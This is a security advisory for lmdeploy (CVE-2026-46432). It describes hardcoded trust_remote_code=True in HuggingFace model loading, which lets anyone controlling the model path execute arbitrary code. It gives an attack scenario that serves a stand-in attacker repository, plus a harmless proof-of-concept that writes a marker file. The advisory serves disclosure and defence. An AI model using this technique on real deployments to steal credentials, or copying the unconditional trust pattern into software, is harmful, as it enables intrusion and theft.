# [H] LMDeploy: Arbitrary code execution via hardcoded trust_remote_code=True in lmdeploy model initialization

## Summary
Severity: High
Advisory: GHSA-m549-qq94-fvhg
CVE: CVE-2026-46432
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-m549-qq94-fvhg
Type: github-advisory

## Affected
- PyPI: `lmdeploy` — affected >=0 <0.13.0

## Details
## Summary

lmdeploy hardcodes `trust_remote_code=True` in multiple HuggingFace model-loading call sites.

The affected code paths are in:

```text
lmdeploy/archs.py
lmdeploy/utils.py
````

The vulnerable call sites pass `trust_remote_code=True` into HuggingFace Transformers APIs such as `AutoConfig.from_pretrained()`, `PretrainedConfig.get_config_dict()`, and `GenerationConfig.from_pretrained()`.

Because the model path is supplied by the operator or deployment configuration, an attacker who can control the `model_path` used by an lmdeploy serving process can point it to an attacker-controlled HuggingFace model repository. When lmdeploy starts and initializes the model, Transformers may download and execute remote Python code from that repository.

Successful exploitation results in arbitrary code execution with the privileges of the lmdeploy serving process.

## Affected version

Confirmed affected:

```text
lmdeploy <= 0.12.3
```

The issue was verified on `v0.12.3` and on `main`.

## Vulnerable code

Confirmed call sites:

```text
lmdeploy/archs.py:154
AutoConfig.from_pretrained(..., trust_remote_code=True)

lmdeploy/archs.py:157
PretrainedConfig.get_config_dict(..., trust_remote_code=True)

lmdeploy/utils.py:225
GenerationConfig.from_pretrained(..., trust_remote_code=True)
```

The vulnerable pattern is:

```python
AutoConfig.from_pretrained(model_path, trust_remote_code=True)
```

and:

```python
GenerationConfig.from_pretrained(path, trust_remote_code=True)
```

The risk is that `trust_remote_code=True` is enabled unconditionally. Users are not required to explicitly opt in through a CLI flag or configuration option.

## Attack scenario

1. An attacker obtains the ability to control or modify the model path used by an lmdeploy deployment. Examples include deployment configuration access, CI/CD configuration access, Kubernetes or container configuration access, or a managed environment where users can submit model IDs for serving.
2. The attacker sets the model path to an attacker-controlled HuggingFace repository, for example:

```text
attacker-org/malicious-model
```

3. The lmdeploy serving process starts with that model path:

```bash
lmdeploy serve api_server attacker-org/malicious-model
```

4. During model initialization, lmdeploy calls HuggingFace Transformers APIs with `trust_remote_code=True`.
5. Transformers loads and executes remote Python code from the attacker-controlled model repository.
6. The payload runs with the privileges of the lmdeploy serving process.

## Why this is security-sensitive

`trust_remote_code=True` is a dangerous HuggingFace option because it allows model repositories to execute custom Python code during model loading.

In lmdeploy, this option is hardcoded at multiple call sites. This removes the explicit trust decision from the user or deployment operator. A safer design would require an explicit CLI flag or configuration option such as `--trust-remote-code`.

lmdeploy is commonly used as a model serving daemon. The serving process may have access to model weights, GPU resources, API credentials, cloud credentials, request data, and internal network resources.

## Proof of concept

The following PoC demonstrates the vulnerable primitive in a local, non-destructive way. It simulates lmdeploy calling a HuggingFace model-loading path with `trust_remote_code=True` and shows that remote model code would execute during initialization.

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import importlib.util
import os
import sys
import tempfile
from pathlib import Path

MARKER = Path("/tmp/LMDEPLOY_TRUST_REMOTE_CODE_RCE_PROOF")
MALICIOUS_MODEL = "attacker-org/malicious-model"


def simulate_lmdeploy_model_load(model_path: str) -> None:
    """
    Simulates lmdeploy model initialization where trust_remote_code=True is hardcoded.

    Real vulnerable pattern:
        AutoConfig.from_pretrained(model_path, trust_remote_code=True)
        GenerationConfig.from_pretrained(path, trust_remote_code=True)

    When trust_remote_code=True, a malicious HuggingFace model repository can
    execute custom Python code during loading.
    """

    fake_model_dir = Path(tempfile.mkdtemp(prefix="fake_lmdeploy_model_"))
    module_name = model_path.split("/")[-1].replace("-", "_")
    modeling_file = fake_model_dir / f"modeling_{module_name}.py"

    payload = f'''
import os
from pathlib import Path

Path("{MARKER}").write_text(
    "lmdeploy trust_remote_code execution confirmed\\n"
    f"model_path={model_path!r}\\n"
    f"pid={{os.getpid()}} euid={{os.geteuid()}}\\n"
)
'''
    modeling_file.write_text(payload)

    spec = importlib.util.spec_from_file_location(f"modeling_{module_name}", modeling_file)
    assert spec is not None and spec.loader is not None

    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--model-id", default=MALICIOUS_MODEL)
    args = parser.parse_args()

    if MARKER.exists():
        MARKER.unlink()

    print(f"[*] Simulating lmdeploy loading model: {args.model_id}")
    print("[*] trust_remote_code=True is hardcoded in lmdeploy model-loading paths")

    simulate_lmdeploy_model_load(args.model_id)

    if MARKER.exists():
        print("[+] Code execution confirmed")
        print(MARKER.read_text())
        return 0

    print("[-] Marker file was not created", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

Expected result:

```text
[+] Code execution confirmed
```

The marker file is written to:

```text
/tmp/LMDEPLOY_TRUST_REMOTE_CODE_RCE_PROOF
```

## Impact

An attacker who can control the model path used by an lmdeploy deployment can execute arbitrary Python code during model initialization.

The attacker may be able to:

* Read files accessible to the lmdeploy process.
* Access environment variables, model provider credentials, HuggingFace tokens, cloud credentials, and API keys.
* Modify model-serving behavior or tamper with responses.
* Execute arbitrary operating-system commands.
* Access request data or internal service credentials available to the serving process.
* Cause denial of service by crashing or destabilizing the serving daemon.
* Pivot to internal services reachable from the lmdeploy host or container.

## References
- https://github.com/InternLM/lmdeploy/security/advisories/GHSA-m549-qq94-fvhg
- https://nvd.nist.gov/vuln/detail/CVE-2026-46432
- https://github.com/InternLM/lmdeploy/pull/4511
- https://github.com/InternLM/lmdeploy
